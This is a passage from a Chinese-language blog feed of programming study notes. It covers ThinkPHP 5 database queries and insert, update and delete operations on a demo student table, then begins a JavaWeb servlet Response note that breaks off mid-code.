<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">model</span>\<span class="title">Student</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Db</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">DataTest1</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        $data=Db::table(<span class="string">'student'</span>)-&gt;find(<span class="number">18008002</span>);</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> json($data);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"sno"</span>:<span class="string">"18008002"</span>,<span class="attr">"sname"</span>:<span class="string">"张杰"</span>,<span class="attr">"ssex"</span>:<span class="literal">null</span>,<span class="attr">"sage"</span>:<span class="number">21</span>,<span class="attr">"sdept"</span>:<span class="string">"IS"</span>&#125;</span><br></pre></td></tr></table></figure></p>
<h5 id="getLastSql"><a href="#getLastSql" class="headerlink" title="getLastSql()"></a>getLastSql()</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">model</span>\<span class="title">Student</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Db</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">DataTest2</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        $data=Db::table(<span class="string">'student'</span>)-&gt;find(<span class="number">18008002</span>);</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> Db::getLastSql();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="symbol">`student`</span> <span class="keyword">WHERE</span> <span class="symbol">`sno`</span> = <span class="number">18008002</span> <span class="keyword">LIMIT</span> <span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<p>这个可以检测一下自己刚才的操作对应的sql语句</p>
<h5 id="where"><a href="#where" class="headerlink" title="where()"></a>where()</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">model</span>\<span class="title">Student</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Db</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">DataTest2</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        $data=Db::table(<span class="string">'student'</span>)-&gt;where(<span class="string">'sno'</span>,<span class="number">18008010</span>)-&gt;find();</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> json($data); </span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p>由于ThinkPHP的优化，可以不采用这种链式查询，直接在find()里指定也一样，但是find()中指定的只能为简单的条件查询,且find()只能以主键作为查询条件</p>
<p>运行结果<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"sno"</span>:<span class="string">"18008010"</span>,<span class="attr">"sname"</span>:<span class="string">"杨紫"</span>,<span class="attr">"ssex"</span>:<span class="literal">null</span>,<span class="attr">"sage"</span>:<span class="number">26</span>,<span class="attr">"sdept"</span>:<span class="string">"IS"</span>&#125;</span><br></pre></td></tr></table></figure></p>
<h5 id="value"><a href="#value" class="headerlink" title="value()"></a>value()</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">model</span>\<span class="title">Student</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Db</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">DataTest2</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        $data=Db::name(<span class="string">'student'</span>)-&gt;where(<span class="string">'sno'</span>,<span class="number">201215125</span>)-&gt;value(<span class="string">'sname'</span>);</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> json($data);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="string">"张立"</span></span><br></pre></td></tr></table></figure></p>
<h5 id="column"><a href="#column" class="headerlink" title="column()"></a>column()</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">model</span>\<span class="title">Student</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Db</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">DataTest2</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        $data=Db::name(<span class="string">'student'</span>)-&gt;column(<span class="string">'sno'</span>);</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> json($data);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[<span class="string">"18008001"</span>,<span class="string">"18008002"</span>,<span class="string">"18008010"</span>,<span class="string">"201215121"</span>,<span class="string">"201215122"</span>,<span class="string">"201215123"</span>,<span class="string">"201215124"</span>,<span class="string">"201215125"</span>]</span><br></pre></td></tr></table></figure></p>
<p>还可以将sno作为列值的索引<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">model</span>\<span class="title">Student</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Db</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">DataTest2</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php"><span class="comment">//        $data=Db::name('student')-&gt;column('sno');</span></span></span><br><span class="line"><span class="php">        $data=Student::column(<span class="string">'sname'</span>,<span class="string">'sno'</span>);</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> json($data);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"18008001"</span>:<span class="string">"刘昊然"</span>,<span class="attr">"18008002"</span>:<span class="string">"张杰"</span>,<span class="attr">"18008010"</span>:<span class="string">"杨紫"</span>,<span class="attr">"201215121"</span>:<span class="string">"李勇"</span>,<span class="attr">"201215122"</span>:<span class="string">"刘晨"</span>,<span class="attr">"201215123"</span>:<span class="string">"王敏"</span>,<span class="attr">"201215124"</span>:<span class="string">"宋洁"</span>,<span class="attr">"201215125"</span>:<span class="string">"张立"</span>&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="链式查询"><a href="#链式查询" class="headerlink" title="链式查询"></a>链式查询</h4><ol>
<li><p>前面学习的通过指向符号<code>-&gt;</code>多次连续调用的方法被称为链式查询</p>
</li>
<li><p>当Db::name(‘user’)时，返回数据库对象，即可连缀数据库对应的方法</p>
</li>
<li><p>每次执行一个数据库查询方法时，比如where()，还将返回数据库对象</p>
</li>
<li><p>只要还是数据库对象，那么就可以一直使用指向符号进行链式查询</p>
</li>
<li><p>如果想要最后得到结果，那么可以使用find(),select()方法结束查询</p>
</li>
<li><p>find()和select()方法放在最后是为了结束查询，不属于链式查询方法</p>
</li>
</ol>
<p>想要获取数据库对象，可以使用<code>print_r()</code>方法</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">model</span>\<span class="title">Student</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Db</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">DataTest3</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        print_r(Db::name(<span class="string">'student'</span>));</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p>访问之后，可以看到数据库的连接对象的各种方法和信息</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">model</span>\<span class="title">Student</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Db</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">DataTest3</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        print_r(Db::name(<span class="string">'student'</span>)-&gt;where(<span class="string">'sno'</span>,<span class="string">'18008002'</span>)-&gt;order(<span class="string">'sno'</span>,<span class="string">'desc'</span>)-&gt;select());</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Array</span> ( [<span class="number">0</span>] =&gt; <span class="keyword">Array</span> ( [sno] =&gt; <span class="number">18008002</span> [sname] =&gt; 张杰 [ssex] =&gt; [sage] =&gt; <span class="number">21</span> [sdept] =&gt; IS ) )<span class="number">0.044063</span>sShowPageTrace</span><br></pre></td></tr></table></figure><br>更多查看<br><a href="https://www.kancloud.cn/thinkphp/thinkphp5_quickstart/478293" target="_blank" rel="noopener">https://www.kancloud.cn/thinkphp/thinkphp5_quickstart/478293</a></p>
<h3 id="增删改操作"><a href="#增删改操作" class="headerlink" title="增删改操作"></a>增删改操作</h3><h4 id="新增数据"><a href="#新增数据" class="headerlink" title="新增数据"></a>新增数据</h4><ul>
<li>使用insert()方法向数据表添加一条数据</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">model</span>\<span class="title">Student</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Db</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">DataTest4</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">       $data=[<span class="string">'sno'</span>=&gt;<span class="number">18008003</span>,</span></span><br><span class="line"><span class="php">              <span class="string">'sname'</span>=&gt;<span class="string">'51nd0re1'</span>,</span></span><br><span class="line"><span class="php">              <span class="string">'ssex'</span>=&gt;<span class="string">'男'</span>,</span></span><br><span class="line"><span class="php">              <span class="string">'sage'</span>=&gt;<span class="number">20</span>,</span></span><br><span class="line"><span class="php">              <span class="string">'sdept'</span>=&gt;<span class="string">'DBA'</span></span></span><br><span class="line"><span class="php">           ];</span></span><br><span class="line"><span class="php">       Db::name(<span class="string">'student'</span>)-&gt;insert($data);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p>运行结果就添加了一行数据，但是这样就算新增成功了也不会有什么提示，所以可以这样改一下<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">model</span>\<span class="title">Student</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Db</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">DataTest4</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">       $data=[<span class="string">'sno'</span>=&gt;<span class="number">18008003</span>,</span></span><br><span class="line"><span class="php">              <span class="string">'sname'</span>=&gt;<span class="string">'51nd0re1'</span>,</span></span><br><span class="line"><span class="php">              <span class="string">'ssex'</span>=&gt;<span class="string">'男'</span>,</span></span><br><span class="line"><span class="php">              <span class="string">'sage'</span>=&gt;<span class="number">20</span>,</span></span><br><span class="line"><span class="php">              <span class="string">'sdept'</span>=&gt;<span class="string">'DBA'</span></span></span><br><span class="line"><span class="php">           ];</span></span><br><span class="line"><span class="php">       $flag=Db::name(<span class="string">'student'</span>)-&gt;insert($data);</span></span><br><span class="line"><span class="php">       <span class="keyword">if</span> ($flag) <span class="keyword">return</span> <span class="string">'新增成功'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>运行结果还是一样，只不过多输出了一句新增成功，insert()方法成功执行会返回1</p>
<p>使用insertGetId()方法，可以在新增成功后返回当前数据ID</p>
<p>使用insertAll()方法，可以批量添加数据<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">model</span>\<span class="title">Student</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Db</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">DataTest4</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">       $dataAll=[</span></span><br><span class="line"><span class="php">              [<span class="string">'sno'</span>=&gt;<span class="number">18008003</span>,</span></span><br><span class="line"><span class="php">              <span class="string">'sname'</span>=&gt;<span class="string">'51nd0re1'</span>,</span></span><br><span class="line"><span class="php">              <span class="string">'ssex'</span>=&gt;<span class="string">'男'</span>,</span></span><br><span class="line"><span class="php">              <span class="string">'sage'</span>=&gt;<span class="number">20</span>,</span></span><br><span class="line"><span class="php">              <span class="string">'sdept'</span>=&gt;<span class="string">'IS'</span></span></span><br><span class="line"><span class="php">              ],</span></span><br><span class="line"><span class="php">              [<span class="string">'sno'</span>=&gt;<span class="number">18008004</span>,</span></span><br><span class="line"><span class="php">              <span class="string">'sname'</span>=&gt;<span class="string">'啦啦啦'</span>,</span></span><br><span class="line"><span class="php">              <span class="string">'ssex'</span>=&gt;<span class="string">'男'</span>,</span></span><br><span class="line"><span class="php">              <span class="string">'sage'</span>=&gt;<span class="number">22</span>,</span></span><br><span class="line"><span class="php">              <span class="string">'sdept'</span>=&gt;<span class="string">'DBA'</span></span></span><br><span class="line"><span class="php">              ]</span></span><br><span class="line"><span class="php">           ];</span></span><br><span class="line"><span class="php">       $flag=Db::name(<span class="string">'student'</span>)-&gt;insertAll($dataAll);</span></span><br><span class="line"><span class="php">       <span class="keyword">if</span> ($flag) <span class="keyword">return</span> <span class="string">'新增成功'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>这样就一次性添加了两条数据</p>
<h4 id="修改数据"><a href="#修改数据" class="headerlink" title="修改数据"></a>修改数据</h4><p>使用update()方法来修改数据，修改成功返回1，修改失败返回0<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">updateTest</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $data=[</span><br><span class="line">        <span class="string">'sname'</span>=&gt;<span class="string">'小兲'</span></span><br><span class="line">    ];</span><br><span class="line">    $flag=Db::name(<span class="string">'student'</span>)-&gt;where(<span class="string">'sno'</span>,<span class="string">'18008004'</span>)-&gt;update($data);</span><br><span class="line">    <span class="keyword">if</span> ($flag)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'修改成功'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'修改失败'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">修改成功</span><br></pre></td></tr></table></figure><br>同时数据库内容也变了<br><img src="/img/PHP/thinkphp/8-3/0.png" alt="avatar"></p>
<p>如果数组中包含了主键，那么就可以不使用where直接修改<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">updateTest</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $data=[</span><br><span class="line">        <span class="string">'sno'</span>=&gt;<span class="number">18008003</span>,</span><br><span class="line">        <span class="string">'sname'</span>=&gt;<span class="string">'西巴哥'</span></span><br><span class="line">    ];</span><br><span class="line">    $flag=Db::name(<span class="string">'student'</span>)-&gt;update($data);</span><br><span class="line">    <span class="keyword">if</span> ($flag)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'修改成功'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'修改失败'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="/img/PHP/thinkphp/8-3/1.png" alt="avatar"></p>
<h4 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h4><p>使用delete()来进行删除，返回影响行数，失败返回0<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">deleteTest</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $flag=Db::name(<span class="string">'student'</span>)-&gt;delete(<span class="number">18008004</span>);</span><br><span class="line">    <span class="keyword">if</span> ($flag)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'删除成功'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'删除失败'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="/img/PHP/thinkphp/8-3/2.png" alt="avatar"><br>这样就直接删除了，直接根据主键删除</p>
<p>还可以删除多条记录<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">deleteTest</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $flag=Db::name(<span class="string">'student'</span>)-&gt;delete([<span class="number">18008001</span>,<span class="number">18008002</span>]);</span><br><span class="line">    <span class="keyword">if</span> ($flag)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'删除成功'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'删除失败'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>效果一样，不演示了</p>
<p>还可以通过where()来删除<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">deleteTest</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $flag=Db::name(<span class="string">'student'</span>)-&gt;where(<span class="string">'sno'</span>,<span class="string">'18008001'</span>)-&gt;delete();</span><br><span class="line">        <span class="keyword">if</span> ($flag)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'删除成功'</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'删除失败'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>如果想要删除数据表所有的数据只需要通过参数true就行<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">deleteTest</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $flag=Db::name(<span class="string">'student'</span>)-&gt;delete(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">if</span> ($flag)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'删除成功'</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'删除失败'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>自行尝试</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>PHP开发</category>
        <category>ThinkPHP</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaWeb-2020/7/31-Response</title>
    <url>/2020/07/31/JavaWeb-2020-7-31-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="Response"><a href="#Response" class="headerlink" title="Response"></a>Response</h1><h2 id="输出字节数据"><a href="#输出字节数据" class="headerlink" title="输出字节数据"></a>输出字节数据</h2><ul>
<li><p>步骤</p>
<ol>
<li><p>获取字节输出流</p>
</li>
<li><p>输出数据</p>
</li>
</ol>
</li>
</ul>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.web.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletOutputStream</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">demo4</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="comment">//设置字符编码</span></span><br><span class="line">        response.setContentType(<span class="string">"text/html;charset=utf-8"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//1.获取字节输出流</span></span><br><span class="line">        <span class="type">ServletOutputStream</span> sos = response.getOutputStream();</span><br><span class="line">        <span class="comment">//2.输出数据</span></span><br><span class="line">        sos.write(<span class="string">"你好"</span>.getBytes(<span class="string">"utf-8"</span>));</span><br><span class="line">    